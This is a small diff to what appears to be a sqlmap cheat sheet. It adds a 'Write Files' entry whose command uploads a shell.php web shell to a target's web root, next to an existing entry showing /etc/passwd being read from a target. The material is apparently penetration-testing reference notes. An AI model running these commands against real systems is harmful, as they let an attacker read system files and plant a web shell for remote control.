@@ -55,6 +55,8 @@ Read Files
 > Output " ~/.sqlmap/output/www.prueba.com/files/_etc_password"
 
 <br>
-```
 
+Write Files
+```
+--file-write "shell.php" --file-dest "/var/www/html/shell.php"
 ```
